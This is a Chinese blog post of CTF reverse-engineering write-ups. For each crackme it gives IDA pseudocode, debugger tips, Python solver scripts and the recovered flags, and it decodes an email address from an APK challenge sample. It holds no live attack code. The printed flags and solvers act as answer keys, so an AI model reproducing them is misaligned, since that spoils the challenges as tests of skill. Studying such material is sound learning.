flag += chr(i)print(flag[::-1]) R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com 网上还有一个爆破版本，不想动脑子了，球球了,我用python实现一下。 https://blog.csdn.net/Palmer9/article/details/105253318 123456789101112131415161718model = [0x0D,0x26,0x49,0x45,0x2A,0x17,0x78,0x44,0x2B,0x6C,0x5D,0x5E,0x45,0x12,0x2F,0x17,0x2B,0x44,0x6F,0x6E,0x56,0x09,0x5F,0x45,0x47,0x73,0x26,0x0A,0x0D,0x13,0x17,0x48,0x42,0x01,0x40,0x4D,0x0C,0x02,0x69]v4 = 4flag = [0]*40for i in range(38,-1,-1): for j in range(128): k = j j ^= v4 if j == model[i]: flag[i] = k v4 = k breakfor i in flag: print(chr(i),end = '') 2.9日补充： 最近比赛挺多，压力都很大，特地过来复习一下od动调： 关于od调试常用的快捷键： https://mambainveins.gitee.io/2020/09/02/2020-09-02-GDB_common_instructions/ F7步进，也就是遇到一个函数会进去，就是步入call的意思。 F8步过，也就是遇到一个函数，执行完之后，不会进入call. F9,直接执行 我们需要做的就是动态调试v4的值，v4在sub_401050这个函数中 然后值等于sub_401000()函数的返回值 首先我们是搜索字符串，定位提示性语句 F8一直步过，到输入字符串的位置停下 我们随便输入一串字符串，回车就能一直运行 现在到达401050这个位置，我们F7步进 然后F7一直步过 到401000下面，我们就能看到v4的值了 al = 4 Youngter-drive(windows多线程+index逆向)Exeinfo: 有壳，咱们脱壳先，对比一下，没有了貌似 继续，咱们用IDA32打开 下一步 123456789101112131415161718int __cdecl main_0(int argc, const char **argv, const char **envp){ HANDLE Thread; // [esp+D0h] [ebp-14h] HANDLE hObject; // [esp+DCh] [ebp-8h] ((void (*)(void))sub_4110FF)(); ::hObject = CreateMutexW(0, 0, 0); j_strcpy(Destination, &amp;Source); hObject = CreateThread(0, 0, StartAddress, 0, 0, 0); Thread = CreateThread(0, 0, sub_41119F, 0, 0, 0); CloseHandle(hObject); CloseHandle(Thread); while ( dword_418008 != -1 ) ; sub_411190(); CloseHandle(::hObject); return 0;} 首先是sub_4110FF()函数，我们跟进 1((void (*)(void))sub_4110FF)(); 输入语句，将输出的flag给Source， 12::hObject = CreateMutexW(0, 0, 0); ::hObject = CreateMutexW(0, 0, 0); CreateMutexW函数，创建或者打开一个命名或未命名的互斥对象 1j_strcpy(Destination, Source); 将source赋值给destination 1234hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);Thread = CreateThread(0, 0, sub_41119F, 0, 0, 0);CloseHandle(hObject);CloseHandle(Thread); 创建线程 CreateThread(0, 0, StartAddress, 0, 0, 0)，通常起始地址是程序代码中定义的函数名称 后面的CloseHandle真实关闭前面线程对象的句柄 我们跟进StartAddress 1234567891011121314void __stdcall __noreturn StartAddress_0(int a1){ while ( 1 ) { WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 &gt; -1 ) { sub_41112C(Source, dword_418008); --dword_418008; Sleep(0x64u); } ReleaseMutex(hObject); }} 这边的sleep(0x64u)要当心，这个函数对字符串的加密是隔一个字符加密 123456789101112131415161718192021// 已检测到正的sp值, 输出可能错误! char *__cdecl sub_411940(int a1, int a2){ char *result; // eax char v3; // [esp+D3h] [ebp-5h] v3 = *(a2 + a1); if ( (v3 &lt; 'a' || v3 &gt; 'z') &amp;&amp; (v3 &lt; 'A' || v3 &gt; 'Z') ) exit(0); if ( v3 &lt; 'a' || v3 &gt; 'z' ) { result = off_418000[0]; *(a2 + a1) = off_418000[0][*(a2 + a1) - 38]; } else { result = off_418000[0]; *(a2 + a1) = off_418000[0][*(a2 + a1) - 96]; } return result;} https://www.cnblogs.com/Mayfly-nymph/p/12573658.html 第二个线程执行的函数： 12345678910111213void __stdcall __noreturn sub_411B10(int a1){ while ( 1 ) { WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 &gt; -1 ) { Sleep(0x64u); --dword_418008; } ReleaseMutex(hObject); }} 有两个线程，别人博客上面，还得确认哪一个线程先执行，说是第二个先执行 也就是偶数不变，奇数会变。 下面是代码： 1234567891011121314# -*- coding:utf-8 -*-secret = &quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;flag = ''model = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;for i in range(len(secret)): if i % 2 == 0: flag += secret[i] continue if(secret[i].isupper()): flag += chr(model.find(secret[i]) + 96) else: flag += chr(model.find(secret[i]) + 38)print ('flag{'+flag+'}') 不用看了，我甚至连线程的工作原理都不知道，先去看看python的多线程机制 https://www.runoob.com/python/python-multithreading.html 创建线程类，生成线程对象，将需要运行的函数放入run（）这个方法中，而且每运行一次都需要获得锁，来保证线程的同步性，在运行完成之后需要释放锁，还可以把线程放入线程列表中，使其具有优先级，使其可以交替执行 现在可以理解了。。 flag{ThisisthreadofwindowshahaIsES} z1r0的博客上说，最后差了一位，确实 传入的参数a2,是29，而我们要求的flag为30位 该爆破是就爆破： 123flag = 'ThisisthreadofwindowshahaIsES'for i in range(26): print(flag+chr(ord('A')+i)) flag{ThisisthreadofwindowshahaIsESE} [WUSTCTF2020]level2（upx脱壳） 查壳后发现有壳，upx工具走起 打开之后，没看到正确的主函数 在string窗口中，找到了，试试呗 好家伙，还真是 flag{Just_upx_-d} 去看看z1r0的博客吧，z1r0老师傅专程详解了汇编代码，我得好好看看 相册（apk病毒+base64） 有意思…… 看了一段时间就麻了 看看z1r0的博客中，用的是导航中的搜索文本功能，搜索的是email 然后直接跟进sendMailjavamail 这个软件的操作和ida一样啊，x键就能看到引用的地方，跟进之后 跟进后面的的MAILSERVER 嗯，base64加密…… 然后是解压apk,找到.so文件，我都不知道so文件是干嘛的 百度了一下，so文件对于linux系统来说，就像dll文件相对于windows系统一样，一般来讲，so文件称为共享库 https://blog.csdn.net/wangquan1992/article/details/113770115 我搞了半天也不知道so文件怎么打开 什么叫strings看一下，哈哈哈 1234567import base64string = 'MTgyMTg0NjUxMjVAMTYzLmNvbQ=='flag = base64.b64decode(string)print(flag) 18218465125@163.com 我的心态是这样的： [HDCTF2019]Maze (easy 迷宫) 有壳，万能脱壳FFI，没有壳了应该 maze是迷宫的意思，之前做过一个迷宫的题目，被虐了 上来啥也别干，直接查看strings窗口 找到了！ 用python 算了一下是70个字符，我猜是7*10 12345678maze = &quot;*******+********* ****** **** ******* **F****** **************&quot;print(len(maze))for i in range(7): for j in range(10): print(maze[i*10+j],end = '') print() 这边是输入14个字符，看我上面的图案，还真是 接下来就是寻找规则了 22333233224441？ ssaaasaassdddw? 好家伙，第二个就对了，笑死了 flag{ssaaasaassdddw} [WUSTCTF2020]level1先查壳 没有壳,然后放到ida64中打开 1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp){ int i; // [rsp+4h] [rbp-2Ch] FILE *stream; // [rsp+8h] [rbp-28h] char ptr[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v7; // [rsp+28h] [rbp-8h] v7 = __readfsqword(0x28u); stream = fopen(&quot;flag&quot;, &quot;r&quot;); fread(ptr, 1uLL, 0x14uLL, stream); fclose(stream); for ( i = 1; i &lt;= 19; ++i ) { if ( (i &amp; 1) != 0 ) printf(&quot;%ld\\n&quot;, (unsigned int)(ptr[i] &lt;&lt; i)); else printf(&quot;%ld\\n&quot;, (unsigned int)(i * ptr[i])); } return 0;} 很清晰，output文本文件是输出之后的文件 直接上代码： 123456789101112131415lists = [198,232,816,200,1536,300,6144,984,51200,570,92160,\\1200,565248,756,1474560,800,6291456,1782,65536000]print(lists)lists2 = []for i in range(19): if ((i+1) &amp; 1) : n = int(lists[i] &gt;&gt; (i+1)) lists2.append(n) else: n = int(lists[i] // (i+1)) lists2.append(n)print(lists2)for i in range(len(lists2)): print(chr(lists2[i]),end = '') 需要注意的是 i&amp;1 == 1代表是奇数，i&amp;1==0代表是偶数， 1234str[0] 没有输出str[1] &lt;&lt; 1str[2] * 2str[3] &lt;&lt; 3 而对于我们output文件，我们看到的第一个数字198其实是在第二个，所以，可以理解为什么是 int(lists[i] &gt;&gt; (i+1)) i &amp; 1 == 0 代表i是偶数 i &amp; 1 == 1代表i是奇数 最终结果：ctf2020{d9-dE6-20c} [MRCTF2020]Transform(index 逆向) 首先是查壳，没有壳，我们用ida64打开 12345678910111213141516171819202122232425262728293031323334int __cdecl main(int argc, const char **argv, const char **envp){ char Str[104]; // [rsp+20h] [rbp-70h] BYREF int j; // [rsp+88h] [rbp-8h] int i; // [rsp+8Ch] [rbp-4h] sub_402230(argc, argv, envp); sub_40E640(&quot;Give me your code:\\n&quot;); sub_40E5F0(&quot;%s&quot;, Str); if ( strlen(Str) != 33 ) { sub_40E640(&quot;Wrong!\\n&quot;); system(&quot;pause&quot;); exit(0); } for ( i = 0; i &lt;= 32; ++i ) { byte_414040[i] = Str[dword_40F040[i]]; byte_414040[i] ^= LOBYTE(dword_40F040[i]); } for ( j = 0; j &lt;= 32; ++j ) { if ( byte_40F0E0[j] != byte_414040[j] ) { sub_40E640(&quot;Wrong!\\n&quot;); system(&quot;pause&quot;); exit(0); } } sub_40E640(&quot;Right!Good Job!\\n&quot;); sub_40E640(&quot;Here is your flag: %s\\n&quot;, Str); system(&quot;pause&quot;); return 0;} 可以看到，第一个for循环是把输入的字符放到了str中，str[dword_40F040[i]]把值给了byte_414040，byte_414040再与dword_40F040[i]进行异或 下面的for 循环是将dword_40F040[i]与byte_40F0E0做比较 参考链接：https://www.cnblogs.com/Mayfly-nymph/p/12806027.html 总体来说 就是将输入的flag使用dword数组作为索引，打乱顺序 再将打乱后的flag数组，与dword数组异或，得到byte 12345678910111213141516171819202122dword = [0x9, 0x0A, 0x0F, 0x17, 0x7, 0x18, 0x0C, 0x6, 0x1, 0x10,\\ 0x3, 0x11, 0x20,0x1D, 0x0B, 0x1E, 0x1B, 0x16, 4, 0x0D, 0x13, 0x14, \\ 0x15, 0x2, 0x19, 0x5, 0x1F, 0x8, 0x12, 0x1A, 0x1C, 0x0E, 0]byte = [ 0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B,\\0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42,\\ 0x7B, 0x2D, 0x2A, 0x66, 0x42, 0x7E, 0x4C, 0x57,\\ 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45,\\ 0x6F, 0x62, 0x4D]flag = [0]*33for i in range(len(dword)): byte[i] ^= dword[i]for i in range(len(dword)): flag[dword[i]] = byte[i]flag = ''.join([chr(i) for i in flag])print(flag) flag{Tr4nsp0sltiON_Clph3r_1s_3z} 原来关于index转换的题目还能这么做，创建一个全为0的flag列表，然后正序的推理…… [ACTF新生赛2020]usualCrypt 查个壳，没有壳，用IDA32打开 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp){ int v3; // esi int v5[3]; // [esp+8h] [ebp-74h] BYREF __int16 v6; // [esp+14h] [ebp-68h] char v7; // [esp+16h] [ebp-66h] char v8[100]; // [esp+18h] [ebp-64h] BYREF sub_403CF8((int)&amp;unk_40E140); scanf(&quot;%s&quot;, v8); memset(v5, 0, sizeof(v5)); v6 = 0; v7 = 0; sub_401080(v8, strlen(v8), v5); //加密函数 v3 = 0; while ( *((_BYTE *)v5 + v3) == byte_40E0E4[v3] ) //匹配函数 { if ( ++v3 &gt; strlen((const char *)v5) ) goto LABEL_6; } sub_403CF8((int)aError);LABEL_6: if ( v3 - 1 == strlen(byte_40E0E4) ) return sub_403CF8((int)aAreYouHappyYes); else return sub_403CF8((int)aAreYouHappyNo);} 分析一下： 首先是输入将flag放入v8数组中，然后进入了sub_401080这个函数，猜测应该是加密函数，我们继续跟进。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768int __cdecl sub_401080(int a1, int a2, int a3){ int v3; // edi int v4; // esi int v5; // edx int v6; // eax int v7; // ecx int v8; // esi int v9; // esi int v10; // esi int v11; // esi _BYTE *v12; // ecx int v13; // esi int v15; // [esp+18h] [ebp+8h] v3 = 0; v4 = 0; sub_401000(); v5 = a2 % 3; v6 = a1; v7 = a2 - a2 % 3; v15 = a2 % 3; if ( v7 &gt; 0 ) { do { LOBYTE(v5) = *(a1 + v3); v3 += 3; v8 = v4 + 1; *(v8 + a3 - 1) = base[(v5 &gt;&gt; 2) &amp; 0x3F]; *(++v8 + a3 - 1) = base[16 * (*(a1 + v3 - 3) &amp; 3) + ((*(a1 + v3 - 2) &gt;&gt; 4) &amp; 0xF)]; *(++v8 + a3 - 1) = base[4 * (*(a1 + v3 - 2) &amp; 0xF) + ((*(a1 + v3 - 1) &gt;&gt; 6) &amp; 3)]; v5 = *(a1 + v3 - 1) &amp; 0x3F; v4 = v8 + 1; *(v4 + a3 - 1) = base[v5]; } while ( v3 &lt; v7 ); v5 = v15; } if ( v5 == 1 ) { LOBYTE(v7) = *(v3 + a1); v9 = v4 + 1; *(v9 + a3 - 1) = base[(v7 &gt;&gt; 2) &amp; 0x3F]; v10 = v9 + 1; *(v10 + a3 - 1) = base[16 * (*(v3 + a1) &amp; 3)]; *(v10 + a3) = 61;LABEL_8: v13 = v10 + 1; *(v13 + a3) = 61; v4 = v13 + 1; goto LABEL_9; } if ( v5 == 2 ) { v11 = v4 + 1; *(v11 + a3 - 1) = base[(*(v3 + a1) &gt;&gt; 2) &amp; 0x3F]; v12 = (v3 + a1 + 1); LOBYTE(v6) = *v12; v10 = v11 + 1; *(v10 + a3 - 1) = base[16 * (*(v3 + a1) &amp; 3) + ((v6 &gt;&gt; 4) &amp; 0xF)]; *(v10 + a3) = base[4 * (*v12 &amp; 0xF)]; goto LABEL_8; }LABEL_9: *(v4 + a3) = 0; return sub_401030(a3);} 一开始是一个sub_401000函数 12345678910111213int sub_401000(){ int result; // eax char v1; // cl for ( result = 6; result &lt; 15; ++result ) { v1 = byte_40E0AA[result]; byte_40E0AA[result] = base[result]; base[result] = v1; //怎么这么熟悉，C语言里的替换？？ } return result;} 这个函数的意思是将base表中的 我们进入这个byte_40E0AA查看，貌似不是普通的base64加密函数 我们已知： base:ABCDEFGHIJ byte_40E0AA：KLMNOPQRS………… 查看跳出sub_401000，查看后面代码，可以看出是base64加密 我们再继续往后看 1return sub_401030(a3); 最后有一个sub_401030函数，我们继续跟进python 123456789101112131415161718192021222324252627282930int __cdecl sub_401030(const char *a1){ __int64 v1; // rax char v2; // al v1 = '\\0'; if ( strlen(a1) ) { do { v2 = a1[HIDWORD(v1)]; if ( v2 &lt; 'a' || v2 &gt; 'z' ) { if ( v2 &lt; 'A' || v2 &gt; 'Z' ) goto LABEL_9; LOBYTE(v1) = v2 + 32; } else { LOBYTE(v1) = v2 - 32; } a1[HIDWORD(v1)] = v1;LABEL_9: LODWORD(v1) = 0; ++HIDWORD(v1); } while ( HIDWORD(v1) &lt; strlen(a1) ); } return v1;} 可以看出这个函数的意思就是把加密后的结果大小写字母转换， 看最后的比较函数， 123456789101112 while ( *(v5 + v3) == byte_40E0E4[v3] ) // 匹配函数 { if ( ++v3 &gt; strlen(v5) ) goto LABEL_6; } my_print(aError);LABEL_6: if ( v3 - 1 == strlen(byte_40E0E4) ) return my_print(aAreYouHappyYes); else return my_print(aAreYouHappyNo);} 这么多应该都是比较函数，我是这么理解的: 如果v5这个字符串与byte_40E0E4这个字符串相等，则会一直执行while循环对比，直到v3=strlen(v5)+1，然后进入LABEL_6比较，相等则v3-1=strlen(v5)，就输出正确的提示信息； 如果v5与这个字符串有一个不相等，则直接会退出while循环，这时 然后跟进byte_40E0E4，这个时候长度一定不相等，就输出错误的提示信息。 最后与加密之后对比的字符串为： 1string = &quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot; 有个疑问哈，这个z和后面的是分离的，所以怎么分辨那些块是那个字符串，还是可以共用？？如果是aMxh3……字符串这他对应的内容是多少，是和string一致，还是比string少一个z…… 在询问大佬z1r0之后，得知，A 键可以使字符串连接起来 所以，base64对应的字符串： 1base = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; 参考链接：https://blog.csdn.net/yhfgs/article/details/117449856?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3 我们理一下， 先把这个string大小写先转换 修改base64转换表 加密结果通过转换表得到正常加密的结果 base64解密 上代码： 123456789101112131415161718192021import base64import string# 大小写转换string = 'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'.swapcase()# 换表base = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'lis = list(base)for i in range(6,15): lis[10+i],lis[i] = lis[i],lis[10+i]new_base = ''.join(lis)# base64换表解密flag = ''flag += str(base64.b64decode(string.translate(str.maketrans(new_base,base))))print(flag) flag{bAse64_h2s_a_Surprise} [2019红帽杯]easyRE（.fini）查壳之后没有壳，直接用ida64打开，我一般是直接按Tab键看伪代码的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081__int64 sub_4009C6(){ __int64 result; // rax int i; // [rsp+Ch] [rbp-114h] __int64 v2; // [rsp+10h] [rbp-110h] __int64 v3; // [rsp+18h] [rbp-108h] __int64 v4; // [rsp+20h] [rbp-100h] __int64 v5; // [rsp+28h] [rbp-F8h] __int64 v6; // [rsp+30h] [rbp-F0h] __int64 v7; // [rsp+38h] [rbp-E8h] __int64 v8; // [rsp+40h] [rbp-E0h] __int64 v9; // [rsp+48h] [rbp-D8h] __int64 v10; // [rsp+50h] [rbp-D0h] __int64 v11; // [rsp+58h] [rbp-C8h] char v12[13]; // [rsp+60h] [rbp-C0h] BYREF char v13[4]; // [rsp+6Dh] [rbp-B3h] BYREF char v14[19]; // [rsp+71h] [rbp-AFh] BYREF char v15[32]; // [rsp+90h] [rbp-90h] BYREF int v16; // [rsp+B0h] [rbp-70h] char v17; // [rsp+B4h] [rbp-6Ch] char v18[72]; // [rsp+C0h] [rbp-60h] BYREF unsigned __int64 v19; // [rsp+108h] [rbp-18h] v19 = __readfsqword(0x28u); qmemcpy(v12, &quot;Iodl&gt;Qnb(ocy&quot;, 12); v12[12] = 127; qmemcpy(v13, &quot;y.i&quot;, 3); v13[3] = 127; qmemcpy(v14, &quot;d`3w}wek9{iy=~yL@EC&quot;, sizeof(v14)); memset(v15, 0, sizeof(v15)); v16 = 0; v17 = 0; sub_4406E0(0, v15, 37LL); v17 = 0; if ( sub_424BA0(v15) == 36 ) { for ( i = 0; i &lt; sub_424BA0(v15); ++i ) { if ( (v15[i] ^ i) != v12[i] ) { result = 4294967294LL; goto LABEL_13; } } sub_410CC0(&quot;continue!&quot;); memset(v18, 0, 65); sub_4406E0(0, v18, 64LL); v18[39] = 0; if ( sub_424BA0(v18) == '\\'' ) { v2 = my_base64(v18); v3 = my_base64(v2); v4 = my_base64(v3); v5 = my_base64(v4); v6 = my_base64(v5); v7 = my_base64(v6); v8 = my_base64(v7); v9 = my_base64(v8); v10 = my_base64(v9); v11 = my_base64(v10); if ( !sub_400360(v11, off_6CC090) ) { sub_410CC0(&quot;You found me!!!&quot;); sub_410CC0(&quot;bye bye~&quot;); } result = 0LL; } else { result = 4294967293LL; } } else { result = 0xFFFFFFFFLL; }LABEL_13: if ( __readfsqword(0x28u) != v19 ) sub_444020(); return result;} 当我发现这个sub_400E44是base64之后，n键改个名字：my_base64 上面有一堆混淆人的伪代码，咱们直接看重点就行， 1memset(v18, 0, 65); 为v18初始化 1sub_4406E0(0, v18, 64LL); 结合上下文可以知道这个sub_44065E0是赋值给v18的 1234567891011121314151617if ( sub_424BA0(v18) == '\\'' ){ v2 = my_base64(v18); v3 = my_base64(v2); v4 = my_base64(v3); v5 = my_base64(v4); v6 = my_base64(v5); v7 = my_base64(v6); v8 = my_base64(v7); v9 = my_base64(v8); v10 = my_base64(v9); v11 = my_base64(v10); if ( !sub_400360(v11, off_6CC090) ) { sub_410CC0(&quot;You found me!!!&quot;); sub_410CC0(&quot;bye bye~&quot;); } 然后就是将v18base64加密十次，与off_6cc090比较，我们直接把off_6cc090反向解密10次就行 123456789101112131415string = 'Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1\\NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaF\\ZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1\\IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSF\\VYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1\\ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1\\RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbG\\JVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE\\5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1\\YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ=='#十次base64解密之后：?????string_2 = 'https://bbs.pediy.com/thread-254172.htm'print(string) 炸了，给我跳出一个网址。在查看z1r0的博客后，有些不理解的地方，不知道他关于真正flag函数是怎么找到的，在询问z1r0之后，z1r0贴心地给了我提示，我总结一下： 12345v10 = my_base64(v9);v11 = my_base64(v10);if ( !sub_400360(v11, off_6CC090) ){sub_410CC0(&quot;You found me!!!&quot;); 这个off_6cc090就是我们上面要比对的字符串，我们跟进之后： 我们可以先对off_6CC090这个字符串按x,就会弹出下面的框框，可以看到 引用这个字符串所在的函数(也就是上面10个base64加密的坑人的那个……) 引用类型r， 文本（应该是汇编指令） （看来我得好好的去看看IDA权威指南了，一脸蒙蔽……） 然后看颜色就可以知道，下面的byte_6CC0A0，处在同一个段中，我们跟进，然后切换伪代码视图： 我们继续按x,然后就可以看到引用了,我们继续跟进： 地址为.fini_array:00000000006CBEE8 进程终止代码的一部分。程序正常退出时，系统将安排执行这边的代码！！！ 所以这个函数很重要的！！！我们直接点击 sub_400D35这个函数跟进，然后按下tab: 出来了！！ 1if ( (v1 ^ byte_6CC0A0[0]) == 'f' &amp;&amp; (HIBYTE(v4) ^ byte_6CC0A3) == 'g' ) 瞧瞧这第20行的地方，一个f，一个g，很有希望！！ 看上面一行，v4=v1,那就很好理解了： 直接把大佬的原话搬出来： https://www.zhihu.com/people/xu-xu-xuxu-94 后面我看不懂z1r0博客中exp的十六进制数从哪里来的，我就去寻找资料 https://www.i4k.xyz/article/Palmer9/103940709 说找到这串不随机的数，怎么找的，我就用IDA跳转地址的功能，G就可以了 手动输入了一下，发现还真有 用刚学的知识分析一下: r代表读取交叉引用，说明sub_400D35函数引用了这串字符，我怎么没看到…… 跟进去发现，就是这个byte_6CC0A0……(百度一下眼瞎怎么治) 直接上z1r0的代码，不解释了，看懂就行： 1234567891011121314151617v4 = ''str1 = 'flag'key1 = [0x40,0x35,0x20,0x56,0x5D,0x18,0x22,0x45,0x17,0x2F,0x24,0x6E,0x62,0x3C,0x27,0x54,0x48,0x6C,0x24,0x6E,0x72,0x3C,0x32,0x45,0x5B]for i in range(4): v4 += chr(key1[i] ^ ord(str1[i]))print(v4)flag = ''for i in range(25): flag += chr(key1[i] ^ ord(v4[i % 4]))print(flag) 看这个代码就清晰多了，key里面的是那些特殊字符的16进制形式，我们需要求出v4,使得v4的前四位能与key中的前四位进行异或操作时，等于flag，所以我们进行了key1[i]与ord(str1[i])的异或操作，将其还原回来，嗯，可以理解…… 12345678v4 = ''str1 = 'flag'key1 = [0x40,0x35,0x20,0x56,0x5D,0x18,0x22,0x45,0x17,0x2F,0x24,0x6E,0x62,0x3C,0x27,0x54,0x48,0x6C,0x24,0x6E,0x72,0x3C,0x32,0x45,0x5B]for i in range(4): v4 += chr(key1[i] ^ ord(str1[i])) 然后就是让key1中的每个字符，与v4[i%4]进行异或操作，为什么要求余4？因为v4一共就四位。 123456flag = ''for i in range(25): flag += chr(key1[i] ^ ord(v4[i % 4]))print(flag) flag{Act1ve_Defen5e_Test} 这也真“easy”，真不错…… [GUET-CTF2019]re (暴力+次序) 先查壳，发现有upx壳子，然后我们用upx脱个壳 然后放到IDA 64里面查看 1234567891011121314151617181920212223__int64 __fastcall sub_400E28(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6){ int v6; // edx int v7; // ecx int v8; // er8 int v9; // er9 __int64 result; // rax __int64 v11[5]; // [rsp+0h] [rbp-30h] BYREF unsigned __int64 v12; // [rsp+28h] [rbp-8h] v12 = __readfsqword(0x28u); memset(&amp;v11[1], 0, 24); sub_40F950((__int64)&quot;input your flag:&quot;, a2, a3, a4, a5, a6); sub_40FA80((unsigned int)&quot;%s&quot;, (unsigned int)v11, v6, v7, v8, v9, 0); if ( sub_4009AE((char *)v11) ) sub_410350((__int64)&quot;Correct!&quot;); else sub_410350((__int64)&quot;Wrong!&quot;); result = 0LL; if ( __readfsqword(0x28u) != v12 ) sub_443550(); return result;} 不要慌张，我们直接看correct的上一行，根据我的推测，从键盘输入的字符应该是放到了v11中，我们直接看sub_4009AE这个函数 我们需要求的就是a1这个数组了 然后我们直接上代码： 1234567891011121314151617181920lists1 = [1629056,6771600,3682944,10431000,3977328, 5138336,7532250,\\ 5551632,3409728,13013670,6088797,7884663,8944053,5198490,\\ 4544518,3645600,10115280,9667504,5364450,13464540, 5488432,\\ 14479500,6451830,6252576,7763364,7327320,8741520,8871876,\\ 4086720,9374400,5759124]lists2 = [166163712,731332800 ,357245568,1074393000,489211344,518971936,\\ 406741500,294236496,177305856,650683500,298351053,386348487,\\ 438258597,249527520,445362764,174988800,981182160,493042704,\\ 257493600,767478780,312840624,1404511500,316139670,619005024,\\ 372641472,373693320,498266640,452465676,208422720,515592000,\\ 719890500]lists = []for i in range(len(lists1)): lists.append(chr(int(lists2[i]/lists1[i])))for i in lists: print(i,end = '') flag{e65421110b0a3099a1c039337}，提交之后竟然错了。。。 知错就改，z1r0中的博客说a[6]不存在，z1r0然后用暴力枚举，把a[6]给爆破出来了，上代码： 1234567891011121314151617181920212223lists1 = [1629056,6771600,3682944,10431000,3977328, 5138336,7532250,\\ 5551632,3409728,13013670,6088797,7884663,8944053,5198490,\\ 4544518,3645600,10115280,9667504,5364450,13464540, 5488432,\\ 14479500,6451830,6252576,7763364,7327320,8741520,8871876,\\ 4086720,9374400,5759124]lists2 = [166163712,731332800 ,357245568,1074393000,489211344,518971936,\\ 406741500,294236496,177305856,650683500,298351053,386348487,\\ 438258597,249527520,445362764,174988800,981182160,493042704,\\ 257493600,767478780,312840624,1404511500,316139670,619005024,\\ 372641472,373693320,498266640,452465676,208422720,515592000,\\ 719890500]lists = []for i in range(len(lists1)): lists.append(chr(int(lists2[i]/lists1[i])))flag = &quot;&quot;.join(lists)print(flag)for i in range(10): print(flag[0:6]+chr(48+i)+flag[6:len(flag)]) 奇怪啊，z1r0说，结果为第二个，为什么还是错的？？ 返回ADI中，我看到了： 还得注意次序！！ flag{e165421110ba03099a1c039337} [SUCTF 2019] SignIn（rsa plus）RSA绝对是当今应用最为广泛的公钥加密算法 这是我第二次碰到rsa算法了，这次不能放过它了 这里我参考了b站油管rsa的介绍 https://www.bilibili.com/video/BV14y4y1272w?from=search&amp;seid=6444314376553406414&amp;spm_id_from=333.337.0.0 看看z1r0的博客，发现一篇文章也说的很好 https://blog.csdn.net/dbs1215/article/details/48953589 什么是rsa? rsa是一种加密和解密使用不同密码的方式，因此公钥密码通常车给非对称密码 rsa加密 密文＝明文^E mod N 常说的公钥为E和N的组合，我们就用（E，N）来表示公钥 rsa解密 明文＝密文^D mod N 对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程，知道D和N就能进行 一般题目的解题方法 一般的题目中会给出我们E和N，这两个是属于公钥，我们可以先把N放到因式分解工具找出P和Q，然后通过rsatool求出d——需要把N,E,Q,P都放到rsatool中并且调试对应的配置，最后是脚本的编写，具体我会放在后面 1因式分解工具：http://www.factordb.com/index.php 先查看题目，记得是没有壳的 记住rsa的特性，一个非常长的数字N，还有一个很短的数字E 分析一下题目，v8用来接受输入的字符，然后v8,v9进入了一个sub_96A的函数,我们跟进查看 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;string.h&gt;int byte_202010[16] = {0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66};size_t sub_96A(const char *a1, char *a2){ size_t result; int v3 = 0; int i; for (i = 0;; i += 2) { result = strlen(a1); result = strlen(a1); if (v3 &gt;= result) break; a2[i] = byte_202010[a1[v3] &gt;&gt; 4]; a2[i + 1] = byte_202010[a1[v3++] &amp; 0xF]; } return result;}int main(int argc,char **argv){ char v8[20]; char v9[101]; scanf(&quot;%s&quot;, v8); sub_96A(v8, v9); printf(&quot;%s\\n&quot;, v9); return 0;}//C语言，16进制位0x,和python一致//size_t为无符号整数类型//字符数组的形式参数，用char * a//字符数组的输出，直接用%s就行了 